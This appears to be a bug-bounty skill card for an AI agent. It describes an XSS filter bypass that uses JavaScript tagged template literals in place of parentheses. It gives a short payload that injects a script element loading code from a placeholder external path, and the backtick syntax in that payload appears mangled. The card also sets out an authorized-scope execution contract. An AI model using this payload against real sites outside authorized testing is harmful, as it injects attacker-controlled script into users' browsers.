# SKILL: XSS: حقن سكريبت خارجي من غير أقواس

**Skill id:** `tip/xss-حقن-سكريبت-خارجي-من-غير-أقواس`  
**Category:** XSS  
**Rating:** ⭐ جيدة  
**Status:** Not started  
**Notion:** https://app.notion.com/p/3dcdac31e88081ae9532fd62d8cc4613  

> **Authorized testing only.** LEAD until validated on accounts/objects you own. Never auto-confirm.

## When the agent should use this skill

- Hunting track involves: **XSS**
- Target signals match this technique
- Scope and testing envelope confirmed

## How It Works

استخدام tagged template literals في JS بدل الأقواس العادية () عشان تتجاوز فلاتر بتدور على الأقواس في الـ XSS payloads.

## Payload / Code

```
s=document.createElementscript;
s.src="//[path.to/external.js](http://path.to/external.js)";
document\["body"\].append${s}
```

## Source

Md Ismail Šojal — @thercem an (Twitter)

## Agent execution contract

1. Confirm asset is in authorized scope.
2. Baseline with an account/object you control.
3. Apply **one** mutation from the payload at a time.
4. Discriminate benign explanations (cache, public data, UI-only).
5. Classify as **LEAD** until unauthorized consequence is proven.
6. Stop if real third-party data appears beyond minimal evidence.
7. Hand off to report template only after validation checklist passes.

---
_Synced from Notion Bug Bounty Tips and Tricks · agent skill ready._
